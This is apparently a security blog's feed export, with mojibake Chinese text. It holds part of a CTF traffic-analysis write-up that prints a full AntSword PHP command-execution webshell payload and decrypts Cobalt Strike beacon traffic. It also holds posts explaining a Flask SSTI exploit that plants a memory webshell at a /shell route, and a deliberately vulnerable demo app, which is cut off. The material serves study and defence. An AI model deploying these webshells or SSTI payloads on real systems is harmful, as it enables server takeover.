class="line">5</span><br></pre></td><td class="code"><pre><span class="line">14433&#x3D;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD&#x2F;APDomON6gwSDFJNUpJNUs2TEs0j9XU1LQGAA&#x3D;&#x3D;</span><br><span class="line">_0x0d4e2de6c1fa7&#x3D;jVZtT9tIEP5+v2JZWcRWTZy3o5Q9U6MqVSvRAxF0fCiV5dhrsodjW7sOgUv8329m&#x2F;ZYA1ysI5JmdeXbeZz2RCl&#x2F;xwqSRUHkSPPtcykwqahM6oBbz4MwvxJL7iViKwhxYzMjySEjXQ8171MxynvrzQHFgg4qIzUrEIhsjC9eRC99psOSm4c+m139Nr7&#x2F;T2afrr1c3&#x2F;uevF9M&#x2F;z79N6Q8NG0jp5pLf+2AJ3EUdtj11qF2jMQ&#x2F;OwcB8pRZmJW1rfFs9K7TEL&#x2F;gy90HUtCwWZ5IHYSNIAkUMAedgE9h34Anlr6UognkCZukDaxNmaSHSFWclM4ol+qhP+tTpxzyKhpR5yweEr061pwdeLBLu8yehCtUc7EJ54WJXxWvjvRc1iHa&#x2F;D7EzwrTAKHh7YbiDn+2dg6GoYcA7MNsdMEP8ocQ&#x2F;PIOYV6qAId69szb1vRVs+Z&#x2F;3UgeTLJe7Ns4hcg+gUzIWr9KwEFkK8eNpCMFcFdZG8mIlU4IEyOyIACNfFaa1MaovN5vrvGA0eArxsRhweBr5YcKDFEgeLjJCx8e0TyfxiFa0110GII3QZARCcQxZKAFEga9wEyvk88bIXfTneOJHPMwibqrVXBXgj391Obv5TuOT42E0&#x2F;jAZvh+MJhP6wx5BfRjq50qreB6Nx7+fjE7i8SBulHj6CEKu91PV+WQ8mI+Hg5PxSfBh3Kj+ahuEbgMX2QN7aLku5OgjPQrJHd0Yqryj9JQ6OxSW4RsqUAIQPTDYpFfnN19c2odUtCS1+vTUWSnpJFkYJI6ai3SXbsnuQH9UJPzDquKJ4v97C&#x2F;t06tyKNMrWyoFGhYYaj3Z5s2d1e3l7PNnhvTjWKg3jKltzOVvwJHEeh&#x2F;2Bw9AQbETo&#x2F;eLZrDMELYhf2Er8KU8wSXS73QYqESmHD2i4RrKbFJWCHhWPek6QFvXRAkbjKWj5ksOwDBvUB&#x2F;5cgVIXkUGalWVpSBdylJcwBsOSdo0SQwnEYGDU2WZTu5unMIlxLvmNgqKWnjW1LZGldfUwNJssNAx&#x2F;GeRmr5Bi2bN3GGBykSUYup6NAKysmths7mgnWGwdHsJwhBpIquGIjAOR+tV9Rlzrd+7IVaowH2qRhQ9YgsQI6&#x2F;B1ZUkGNhlaxHUJlCY5PMQg9Kp49iykTWTo3eMn2T3wtlstswxE0rOsBrCQCAgJiyCTDzAboRQdtaAWxB6aEj7IgUs+n1&#x2F;Mprh+imVOXIJ7ATrPfL0nbNILVM9ibQ1&#x2F;ufIvLi9cE5TJEyMlA2fImcYZnR0O9Xp7ZSsIt5RJA4quspJgYsgGHQCmNxy97w&#x2F;gd4hl0vwdzR+xfhvZerJ+DoBiZT0AwYFqyeyNUjQJJvcq1XGoKDStUYIoUAjGJpciLbpZWt9wI3E3lfv37aU0XEawUqDSQAb3zC+OLyhTDE7V6BCZjVd9ApaNUHW91mJ5oFSxkCst2BBvi+oSgyrlIQpXXnkdE23dV2hEvfoY3go1bKX8dyZSk&#x2F;6Gz4sXmjmuSFQ14hw2MVKo35NQKOsFZAK3vl65cd7ZEkN6sH9yezSYnCCkl4dJprgW279AZqHfXoIV6rUsvIlUvTYk7ln92ctFzntQrese1Ozo7QM4MUT20kaRfR&#x2F;+eGWm5raWvtIYvakx6jS8uPatgme79Ahp7VDNe+F+APXb1UdLYQpbuTeHitV2CCayld1ffgduPWG8MIGKagYb&#x2F;XT5jWK4127K1wQos3c7C6XIi76+qYfr3TXWR2dNPcEbIXMNfnQ2K6JLfNcwvLbvAvvo7BpG0HmSIFPxRmoq5Y4U35Wq+7Cra91ZkHqYC800rt3SAK7XNKHs02b2aBCiUQ7cgfWRoqAGKuFRQBkrw6CAVTZ9CnmuO9ng1qZ6P02vry+vT+ER2UdjIaffuFLBPccVwrq3G4sEsv4F</span><br><span class="line">b430b310838a93&#x3D;4g</span><br><span class="line">f861d394170244&#x3D;X4Y21k</span><br><span class="line">ufbd335828f30f&#x3D;0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯å¯¹è§£å‹åŒ…çš„urlè§£ç ï¼Œç„¶ågzip+base64è§£ç å°è¯•è¿˜åŸä»£ç å†…å®¹,å¯¹ä¸Šé¢çš„æ¯ä¸ªå‚æ•°è¿›è¡Œè§£å¯†!ä¸‹é¢è¿™ä¸ªåŒ…æ˜¯è§£å‹ç¼©çš„åŒ…çš„è§£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">$opdir&#x3D;@ini_get(&quot;open_basedir&quot;);</span><br><span class="line">if($opdir) &#123;</span><br><span class="line">$ocwd&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$oparr&#x3D;preg_split(&quot;&#x2F;;|:&#x2F;&quot;,$opdir);</span><br><span class="line">@array_push($oparr,$ocwd,sys_get_temp_dir());</span><br><span class="line">foreach($oparr as $item) &#123;</span><br><span class="line">if(!@is_writable($item)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$tmdir&#x3D;$item.&quot;&#x2F;.fedd1&quot;;</span><br><span class="line">@mkdir($tmdir);</span><br><span class="line">if(!@file_exists($tmdir)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">@chdir($tmdir);</span><br><span class="line">@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);</span><br><span class="line">$cntarr&#x3D;@preg_split(&quot;&#x2F;\\\\|\&#x2F;&#x2F;&quot;,$tmdir);</span><br><span class="line">for ($i&#x3D;0;$i&lt;sizeof($cntarr);$i++) &#123;</span><br><span class="line">@chdir(&quot;..&quot;);</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">@ini_set(&quot;open_basedir&quot;,&quot;&#x2F;&quot;);</span><br><span class="line">@rmdir($tmdir);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">return $out;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">$output&#x3D;ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">echo &quot;36&quot;.&quot;4f2&quot;;</span><br><span class="line">echo @asenc($output);</span><br><span class="line">echo &quot;42&quot;.&quot;ff1&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">$p&#x3D;base64_decode(substr($_POST[&quot;f861d394170244&quot;],2));</span><br><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br><span class="line">$envstr&#x3D;@base64_decode(substr($_POST[&quot;b430b310838a93&quot;],2));</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \&quot;&#123;$s&#125;\&quot;&quot;:&quot;&#x2F;c \&quot;&#123;$s&#125;\&quot;&quot;;</span><br><span class="line">if(substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;) &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(!empty($envstr)) &#123;</span><br><span class="line">$envarr&#x3D;explode(&quot;|||asline|||&quot;, $envstr);</span><br><span class="line">foreach($envarr as $v) &#123;</span><br><span class="line">if (!empty($v)) &#123;</span><br><span class="line">@putenv(str_replace(&quot;|||askey|||&quot;, &quot;&#x3D;&quot;, $v));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class="line">function fe($f) &#123;</span><br><span class="line">$d&#x3D;explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));</span><br><span class="line">if(empty($d)) &#123;</span><br><span class="line">$d&#x3D;array();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$d&#x3D;array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d));</span><br><span class="line">&#125;</span><br><span class="line">return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runshellshock($d, $c) &#123;</span><br><span class="line">if (substr($d, 0, 1) &#x3D;&#x3D; &quot;&#x2F;&quot; &amp;&amp; fe(&#39;putenv&#39;) &amp;&amp; (fe(&#39;error_log&#39;) || fe(&#39;mail&#39;))) &#123;</span><br><span class="line">if (strstr(readlink(&quot;&#x2F;bin&#x2F;sh&quot;), &quot;bash&quot;) !&#x3D; FALSE) &#123;</span><br><span class="line">$tmp &#x3D; tempnam(sys_get_temp_dir(), &#39;as&#39;);</span><br><span class="line">putenv(&quot;PHP_LOL&#x3D;() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class="line">if (fe(&#39;error_log&#39;)) &#123;</span><br><span class="line">error_log(&quot;a&quot;, 1);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">$output &#x3D; @file_get_contents($tmp);</span><br><span class="line">@unlink($tmp);</span><br><span class="line">if ($output !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">print($output);</span><br><span class="line">return True;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runcmd($c) &#123;</span><br><span class="line">$ret&#x3D;0;</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">if(fe(&#39;system&#39;)) &#123;</span><br><span class="line">@system($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;passthru&#39;)) &#123;</span><br><span class="line">@passthru($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;shell_exec&#39;)) &#123;</span><br><span class="line">print(@shell_exec($c));</span><br><span class="line">&#125; elseif(fe(&#39;exec&#39;)) &#123;</span><br><span class="line">@exec($c,$o,$ret);</span><br><span class="line">print(join(&quot;</span><br><span class="line">&quot;,$o));</span><br><span class="line">&#125; elseif(fe(&#39;popen&#39;)) &#123;</span><br><span class="line">$fp&#x3D;@popen($c,&#39;r&#39;);</span><br><span class="line">while(!@feof($fp)) &#123;</span><br><span class="line">print(@fgets($fp,2048));</span><br><span class="line">&#125;</span><br><span class="line">@pclose($fp);</span><br><span class="line">&#125; elseif(fe(&#39;proc_open&#39;)) &#123;</span><br><span class="line">$p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;), 2 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $io);</span><br><span class="line">while(!@feof($io[1])) &#123;</span><br><span class="line">print(@fgets($io[1],2048));</span><br><span class="line">&#125;</span><br><span class="line">while(!@feof($io[2])) &#123;</span><br><span class="line">print(@fgets($io[2],2048));</span><br><span class="line">&#125;</span><br><span class="line">@fclose($io[1]);</span><br><span class="line">@fclose($io[2]);</span><br><span class="line">@proc_close($p);</span><br><span class="line">&#125; elseif(fe(&#39;antsystem&#39;)) &#123;</span><br><span class="line">@antsystem($c);</span><br><span class="line">&#125; elseif(runshellshock($d, $c)) &#123;</span><br><span class="line">return $ret;</span><br><span class="line">&#125; elseif(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123;</span><br><span class="line">$w&#x3D;new COM(&#39;WScript.shell&#39;);</span><br><span class="line">$e&#x3D;$w-&gt;exec($c);</span><br><span class="line">$so&#x3D;$e-&gt;StdOut();</span><br><span class="line">$ret.&#x3D;$so-&gt;ReadAll();</span><br><span class="line">$se&#x3D;$e-&gt;StdErr();</span><br><span class="line">$ret.&#x3D;$se-&gt;ReadAll();</span><br><span class="line">print($ret);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$ret &#x3D; 127;</span><br><span class="line">&#125;</span><br><span class="line">return $ret;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$ret&#x3D;@runcmd($r.&quot; 2&gt;&amp;1&quot;);</span><br><span class="line">print ($ret!&#x3D;0)?&quot;ret&#x3D;&#123;$ret&#125;&quot;:&quot;&quot;;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå‚æ•°sæ¥æ”¶æ‰§è¡Œå‘½ä»¤çš„å‚æ•° Â  Â </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥s=</p><figure class="highlight plain"><figcaption><span>/d "D:\\phpstudy_pro\\WWW\\secret"&"C:\Program Files\7-Zip\7z.exe" x secret.zip -pP4Uk6qkh6Gvqwg3y&echo 378df2c234&cd&echo fb7f8f</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°å‹ç¼©å¯†ç ä¸ºP4Uk6qkh6Gvqwg3yã€‚ä¸‹é¢å°±å¯ä»¥è§£å‹beacon keys.ä¸‹é¢éœ€è¦åšçš„å·¥ä½œä¸ºï¼šè·å¾—ç§é’¥ï¼Œé€šè¿‡ç§é’¥è·å¾—AESå¯†é’¥ä»¥æŸ¥çœ‹ä¸teamserverçš„é€šä¿¡å†…å®¹ã€‚éœ€è¦ç”¨åˆ°çš„å·¥å…·åœ¨<br><a href="https://github.com/WBGlIl/CS_Decrypt">https://github.com/WBGlIl/CS_Decrypt</a></p><p>é¦–å…ˆæ˜¯æ ¹æ®ç§é’¥æ–‡ä»¶æ¢å¤RSA KEYã€‚<img src="http://cdn.polowong.top/1633578377113neqkckzh.png?imageslim" alt="paste image">æ ¹æ®RSA KEY æ¢å¤AES KEYï¼Œéœ€è¦çœ‹beaconé€šä¿¡çš„æ•°æ®åŒ…ï¼Œæ ¹æ®csç‰¹æ€§ï¼Œä¸€èˆ¬è¿™ä¸ªå€¼è—åœ¨cookieé‡Œã€‚<img src="http://cdn.polowong.top/1633578510720pypykjsw.png?imageslim" alt="paste image"><img src="http://cdn.polowong.top/16336126404051wc58fdp.png?imageslim" alt="paste image">æ‹¿åˆ°AES KEYä¹‹åï¼Œç»§ç»­åˆ©ç”¨è„šæœ¬è¿˜åŸbeaconè¿”å›çš„å†…å®¹ï¼Œè¿™é‡ŒæŠ“å–çš„æ˜¯submit.phpçš„ç‰¹å¾ã€‚æ ¹æ®CobaltStrikeçš„é€šä¿¡è§„åˆ™ï¼Œbeaconä¼šå‘teamserver POST submit.php?id=xxxï¼ŒPOSTDATAä¸ºAESåŠ å¯†åçš„å†…å®¹ã€‚å°†åŠ å¯†åçš„å†…å®¹å¤åˆ¶å‡ºæ¥ä¹‹åè§£å¯†<img src="http://cdn.polowong.top/163361286315319q01mf9.png?imageslim" alt="paste image"><br>æ³¨æ„éœ€è¦æ˜¯base64æ ¼å¼çš„ï¼Œç„¶åä½¿ç”¨è„šæœ¬è¿›è¡Œè§£å¯†<img src="http://cdn.polowong.top/1633612982627c0it3dfp.png?imageslim" alt="paste image">è§£å¯†åå¾—åˆ°flagã€‚</p><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>è¿™é¢˜å¤ªæŠ˜ç£¨äººäº†ï¼Œåšäº†å¥½ä¹…æ‰åšå‡ºæ¥ï¼Œå†™wpåˆå†™äº†ä¸€æ®µæ—¶é—´ã€‚é¡ºä¾¿å­¦äº†ä¸‹CSçš„ç®€å•é€šä¿¡è¿‡ç¨‹ï¼Œæ”¶è·è¿˜æ˜¯æœ‰çš„ã€‚<br>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/qq_43264813/article/details/120560209">https://blog.csdn.net/qq_43264813/article/details/120560209</a><br><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan">https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan</a><br><a href="https://www.wkr.moe/ctf/610.html#toc-head-3">https://www.wkr.moe/ctf/610.html#toc-head-3</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™é¢˜æŒºæœ‰æ„æ€çš„ï¼Œè¿˜æ˜¯æŒ‰æµé‡åˆ†æçš„æ€è·¯æ¥åšï¼Œä¸ªäººä¹ æƒ¯å…ˆçœ‹poståŒ…&lt;img src=&quot;http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim&quot; alt=&quot;paste image&quot;&gt;åœ¨è¿™é‡Œçœ‹åˆ°äº†å¾ˆå¤šignition</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Analysis of flask memory webshell</title>
    <link href="https://polosec.github.io/2021/09/24/Analysis-of-flask-memory-webshell/"/>
    <id>https://polosec.github.io/2021/09/24/Analysis-of-flask-memory-webshell/</id>
    <published>2021-09-24T13:16:39.000Z</published>
    <updated>2021-09-24T14:56:49.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NOTICE"><a href="#NOTICE" class="headerlink" title="NOTICE"></a>NOTICE</h1><p>Before analysis , I assumed that you know the princple of SSTI and now how to find the exploit chain.You should know  url_for.__globals__ could find global variables in current app.</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>In the previous passage Iâ€™ve introduced memory webshell in flask and implemented it,so in this passage Iâ€™ll analyse the procedure of a web request which request flask and make sense how to generate a memory shell.</p><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>This is a EXP in Flask SSTI vulnerability which could register a route and execute system command.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](</span><br><span class="line">&quot;app.add_url_rule(</span><br><span class="line">&#39;&#x2F;shell&#39;, </span><br><span class="line">&#39;shell&#39;, </span><br><span class="line">lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</span><br><span class="line">)</span><br><span class="line">&quot;,</span><br><span class="line">&#123;</span><br><span class="line">&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],</span><br><span class="line">&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]</span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>There are some complex functions and variables in the PoC,Iâ€™ll explain it.<br>From SSTI we can reach eval function to execute python command,such as eval(â€œ__import__(â€˜osâ€™).popen(â€˜whoamiâ€™).read()â€)<img src="http://cdn.polowong.top/163249208767051gyctei.png?imageslim" alt="paste image"><br>function add_url_rule() is used for adding route,such as add route in flask app.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_url_rule(rule, endpoint&#x3D;None, view_func&#x3D;None, provide_automatic_options&#x3D;None, **options)</span><br></pre></td></tr></table></figure><p>Briefly,we can pass parameter to this function to register route and define the handle function.<br>Usually we can pass(â€˜/shellâ€™,â€™shellâ€™,lambda:xxxx_lambda_function_code) to this function to register a route /shell and define the handle founction.<br>In this demo,the lambda function could receive parameter from front-end and execute system command.It looks like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(</span><br><span class="line">&#39;&#x2F;shell&#39;, </span><br><span class="line">&#39;shell&#39;, </span><br><span class="line">lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</span><br><span class="line">)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p> This lambda function could receive and handle the parameter passed from front-end and execute it.Until now I  didnâ€™t explain variables like request_ctx_stack ã€appã€current_app.</p><p> request_ctx_stack like a stack structure, every web request will be pushed into this stack and pop ã€handle it.<br>So, in this EXP it(request_ctx_stack.top) represents the current request object,just like in your flask appâ€™s every handle function in route to handle the current request!</p><p>request.args.get() is used for get the parameterâ€™s value from front-end,juset need the parameter name and the default value is whoami in this EXP.</p><p>In eval function, we noticed that there is a variable called app, but now we donâ€™t now what is app.But we know that we can pass parameters and values by eval via dict format in python, so we can pass paramater what we used like app,request_ctx_stack.</p><p>We  have analysed  all the EXP, so we can generate a memory webshell now:)<br><img src="http://cdn.polowong.top/1632494776728fam272p6.png?imageslim" alt="paste image">no new route was found in source code:)<img src="http://cdn.polowong.top/1632495118141e8t9fc9j.png?imageslim" alt="paste image"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p> <a href="https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/</a><br> <a href="https://segmentfault.com/blog/myflask">https://segmentfault.com/blog/myflask</a><br> <a href="https://www.cnblogs.com/bigox/p/11652859.html">https://www.cnblogs.com/bigox/p/11652859.html</a><br> <a href="https://englndcib.blogspot.com/2021/08/python-lambda.html">https://englndcib.blogspot.com/2021/08/python-lambda.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NOTICE&quot;&gt;&lt;a href=&quot;#NOTICE&quot; class=&quot;headerlink&quot; title=&quot;NOTICE&quot;&gt;&lt;/a&gt;NOTICE&lt;/h1&gt;&lt;p&gt;Before analysis , I assumed that you know the princple</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>implementation of memory webshell in flask</title>
    <link href="https://polosec.github.io/2021/09/05/webshell-in-flask/"/>
    <id>https://polosec.github.io/2021/09/05/webshell-in-flask/</id>
    <published>2021-09-05T09:30:36.000Z</published>
    <updated>2021-09-15T15:08:03.426Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Server-side Template Injection(SSTI)  is a common vulnerability in Flask framework.If the application choosed flask framework and exists SSTI vulnerability,actually easy to be exploited .</p><p>It is easy to be exploited if a SSTI vulnerability were found. In this page ,Iâ€™ll show how to utilize it to inject webshell into memory.In next passage Iâ€™ll explain the procedure of a Flask app receive,understand and execute the command which sent by user.</p><h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><p>A simple Flask framework web application with SSTI vulnerability as follows:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    template = <span 